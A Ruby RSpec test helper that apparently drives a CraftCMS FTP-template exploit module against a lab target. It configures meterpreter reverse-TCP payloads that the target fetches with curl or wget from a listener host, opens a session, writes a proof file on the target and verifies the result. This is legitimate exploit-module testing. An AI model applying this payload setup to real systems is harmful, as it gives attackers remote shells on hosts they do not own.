# frozen_string_literal: true

# Use real sessions and independently verify their target and database state.
module CraftFtpSessions
  def cf_session(family, reuse: false)
    owner = 'exploit/linux/http/craftcms_ftp_template'
    payload, arch, tool = {
      'fetch-x86' => ['cmd/linux/http/x86/meterpreter_reverse_tcp', 1, 'CURL'],
      'fetch-staged-x64' => ['cmd/linux/http/x64/meterpreter/reverse_tcp', 2, 'WGET']
    }.fetch(family)
    @cf_ready ||= rc_json("begin;load 'test/module_targets/druid_sessions/session_control.rb';DruidSessionControl.install(framework);end")
    @workspace = "craft_#{Process.pid}_ftp#{arch}#{reuse ? 'repeat' : 'first'}"
    expect(console_command('workspace -a ' + @workspace)).not_to include('[-]')
    port = cf_port
    destination = "/tmp/module-target-craft-ftp-fetch-#{Process.pid}-#{port}"
    destination_absent = !it_file(destination).fetch('exists')
    expect(destination_absent).to be(true)
    options = {
      'PAYLOAD' => payload, 'LHOST' => listener_host, 'LPORT' => port,
      'SRVHOST' => listener_host, 'SRVPORT' => cf_port,
      'ReverseListenerBindAddress' => '0.0.0.0', 'DisablePayloadHandler' => false,
      'AutoCheck' => !reuse,
      'SessionRetryTotal' => 10, 'SessionRetryWait' => 1,
      'SessionExpirationTimeout' => 60, 'SessionCommunicationTimeout' => 15,
      'FETCH_COMMAND' => tool, 'FETCH_SRVHOST' => listener_host, 'FETCH_SRVPORT' => cf_port,
      'FetchListenerBindAddress' => '0.0.0.0', 'FETCH_WRITABLE_DIR' => '/tmp',
      'FETCH_FILENAME' => File.basename(destination), 'FETCH_DELETE' => true
    }
    attempt = { family: family, repeat: reuse, workspace: @workspace, qualified: false }
    @rc.fetch(:session_attempts) << attempt
    offset = rc_json('framework.instance_variable_get(:@craft_ftp_events).length')
    output = run_target_module(owner, 'app', options, action: 'run -z', reuse_module: reuse, allow_errors: true)
    attempt[:output_base64] = Base64.strict_encode64(output.b)
    attempt[:selected_instance] = rc_json('active_module.object_id')
    expect(attempt.fetch(:selected_instance)).to eq(@cf_previous_instance) if reuse
    @cf_previous_instance = attempt.fetch(:selected_instance)
    unless @profile.fetch('ftp_vulnerable')
      rc_poll(20) { rc_json('framework.jobs.keys').empty? }
      attempt[:events] = rc_json("framework.instance_variable_get(:@craft_ftp_events)[#{offset}..]")
      expect(attempt.fetch(:events)).to include(include('event' => 'return', 'method' => 'check', 'check' => include('code' => 'safe')))
      expect(attempt.fetch(:events)).not_to include(include('event' => 'call', 'method' => 'exploit'))
      expect(rc_json('framework.sessions.keys')).to eq([])
      expect(it_file(destination)).to include('exists' => false)
      attempt[:qualified] = true
      return
    end
    metadata = rc_poll(35) do
      sessions = rc_json('framework.sessions.map{|id,session|{id:id,type:session.type,owner:session.via_exploit,payload:session.via_payload,db_id:session.db_record&.id}}')
      ready = File.readlines(@cf_ready.fetch('ready_event_path')).map { |line| JSON.parse(line) }
      sessions.find { |row| row['db_id'] && ready.any? { |event| event.fetch('id') == row.fetch('id') } }
    end
    expect(metadata.values_at('type', 'owner', 'payload')).to eq(['meterpreter', owner, 'payload/' + payload])
    identifier = metadata.fetch('id')
    attempt[:metadata] = metadata
    proof = "/tmp/module-target-druid-session-#{Process.pid}_#{identifier}-#{identifier}"
    proof_absent = !it_file(proof).fetch('exists')
    expect(proof_absent).to be(true)
    channels = rc_json("framework.sessions.fetch(#{identifier}).channels.keys.sort")
    result = rc_json("begin;session=framework.sessions.fetch(#{identifier});file=nil;begin;file=session.fs.file.new(#{proof.inspect},'wb');file.write('craft-ftp-session');ensure;file.close if file;end;{pid:session.sys.process.getpid,identity:session.sys.config.getuid,api:'fs.file'};end")
    expect(rc_json("framework.sessions.fetch(#{identifier}).channels.keys.sort")).to eq(channels)
    expect(it_file(proof)).to eq('exists' => true, 'uid' => it_expected_uid, 'base64' => Base64.strict_encode64('craft-ftp-session'))
    native = cc_process(result.fetch('pid'))
    expect(native).to include('exists' => true, 'uid' => it_expected_uid)
    expect(cc_tcp(port)).to include(include('state' => '01', 'uid' => it_expected_uid))
    attempt[:events] = rc_json("framework.instance_variable_get(:@craft_ftp_events)[#{offset}..]")
    check_calls = attempt.fetch(:events).select { |event| event['event'] == 'call' && event['method'] == 'check' }
    expect(check_calls.empty?).to eq(reuse)
    delivery = attempt.fetch(:events).select { |event| event.fetch('event') == 'delivery' }.last
    expect(delivery).to include('elf_class' => arch, 'sha256' => native.fetch('exe_sha256'))
    reports = JSON.parse(rc_sql("SELECT coalesce(json_agg(row),'[]'::json) FROM (SELECT session.id,session.stype,session.via_exploit,session.via_payload FROM sessions session JOIN hosts host ON host.id=session.host_id JOIN workspaces workspace ON workspace.id=host.workspace_id WHERE workspace.name='#{@workspace}') row"))
    expect(reports).to include(include('id' => metadata.fetch('db_id'), 'stype' => 'meterpreter', 'via_exploit' => owner, 'via_payload' => 'payload/' + payload))
    attempt.merge!(proof: result, native_process: native, delivery: delivery, reports: reports, qualified: true)
    @rc.fetch(:sessions) << attempt
  ensure
    original_error = $ERROR_INFO
    begin
      if proof_absent
        rc_command('remove-ftp-session-proof', 'app', 'rm', '-f', proof)
        expect(it_file(proof)).to include('exists' => false)
      end
      remaining = rc_json('framework.sessions.keys')
      remaining.each do |session_id|
        exit_result = rc_json("DruidSessionControl.dispatch(framework,'exit',#{session_id})")
        expect(exit_result).not_to have_key('error') unless original_error
        rc_json("begin;session=framework.sessions[#{session_id}];session.kill if session;{closed:#{session_id}};end")
      end
      if identifier
        rc_poll { cc_tcp(port).none? { |row| %w[01 08].include?(row.fetch('state')) } }
        rc_poll { !cc_process(result.fetch('pid')).fetch('exists') } if result
        closed = rc_poll { JSON.parse(rc_sql("SELECT coalesce(json_agg(row),'[]'::json) FROM (SELECT id,closed_at FROM sessions WHERE id=#{metadata.fetch('db_id')}) row")).find { |row| row['closed_at'] } }
        attempt[:closed_report] = closed
      end
      console_command('jobs -K')
      expect(rc_json('{sessions:framework.sessions.keys,jobs:framework.jobs.keys}')).to eq('sessions' => [], 'jobs' => [])
      rc_poll { !it_file(destination).fetch('exists') } if destination_absent
      expect(cc_snapshot).to eq(@baseline) if @baseline
      rc_resources('after-ftp-session')
    rescue StandardError, RSpec::Expectations::ExpectationNotMetError => e
      @rc.fetch(:cleanup_errors) << { type: e.class.name, message: e.message, primary_error: original_error&.message }
      raise unless original_error
    ensure
      rc_save
    end
  end
end
